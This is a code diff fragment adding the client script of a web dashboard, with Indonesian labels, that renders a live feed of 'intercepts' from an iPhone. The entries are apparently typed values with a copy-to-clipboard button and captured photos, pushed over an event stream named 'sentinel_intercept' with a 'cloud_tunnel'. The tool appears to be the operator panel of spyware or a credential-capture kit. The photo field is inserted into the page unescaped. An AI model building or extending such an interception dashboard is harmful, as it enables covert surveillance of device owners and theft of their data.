+        gain.gain.setValueAtTime(0.2, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        osc.stop(ctx.currentTime + 0.4);
+      } catch (e) {}
+    }
+
+    function escapeHtml(str) {
+      return String(str || '').replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+    }
+    function escapeJs(str) {
+      return String(str || '').replace(/['\\]/g, '\\$&');
+    }
+
+    function renderIntercepts(intercepts) {
+      const box = document.getElementById('liveActivityFeed');
+      if (!box) return;
+      if (!Array.isArray(intercepts) || intercepts.length === 0) {
+        box.innerHTML = `<div style="font-size: 11px; color: var(--text-muted); text-align: center; padding: 12px 0;">Menunggu data baru atau perubahan dari iPhone...</div>`;
+        return;
+      }
+      box.innerHTML = intercepts.map(item => `
+        <div style="background: rgba(0, 0, 0, 0.45); border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 10px; padding: 10px; display: flex; flex-direction: column; gap: 4px;">
+          <div style="display: flex; justify-content: space-between; align-items: center; font-size: 11px;">
+            <span style="color: #38bdf8; font-weight: 700;">${escapeHtml(item.label || '⌨️ Data Masuk')}</span>
+            <span style="color: #94a3b8; font-family: monospace;">${new Date(item.timestamp).toLocaleTimeString()}</span>
+          </div>
+          <div style="display: flex; align-items: center; justify-content: space-between; background: rgba(0,0,0,0.6); padding: 6px 8px; border-radius: 6px; margin-top: 2px;">
+            <code style="font-size: 13px; color: #34d399; font-weight: 700; word-break: break-all;">${escapeHtml(item.value)}</code>
+            <button onclick="navigator.clipboard.writeText('${escapeJs(item.value)}'); alert('Data disalin ke clipboard!');" style="margin-left: 8px; padding: 4px 8px; border: none; background: rgba(255,255,255,0.1); color: #fff; font-size: 11px; font-weight: 600; border-radius: 4px; cursor: pointer;">Salin</button>
+          </div>
+          ${item.photo ? `<div style="margin-top: 4px;"><img src="${item.photo}" style="width: 100%; max-height: 80px; object-fit: cover; border-radius: 6px;" /></div>` : ''}
+        </div>
+      `).join('');
+    }
+
+    // SSE Real-time Listener
+    function initEventStream() {
+      try {
+        const evtSource = new EventSource('/api/events');
+        evtSource.onmessage = (event) => {
+          try {
+            const msg = JSON.parse(event.data);
+            if (msg.type === 'sentinel_beacon' && msg.current) {
+              renderTelemetry(msg.current, msg.alerts);
+            } else if (msg.type === 'sentinel_intercept' && msg.intercept) {
+              playChimeSound();
+              fetchStatus();
+            } else if (msg.type === 'cloud_tunnel_ready') {
+              fetchStatus();
+            }
+          } catch(e) {}
+        };
+      } catch(e) {}
+    }
+
+    initEventStream();
+
+    // Polling setiap 3 detik
+    fetchStatus();
+    setInterval(fetchStatus, 3000);
+  </script>
+</body>
+</html>
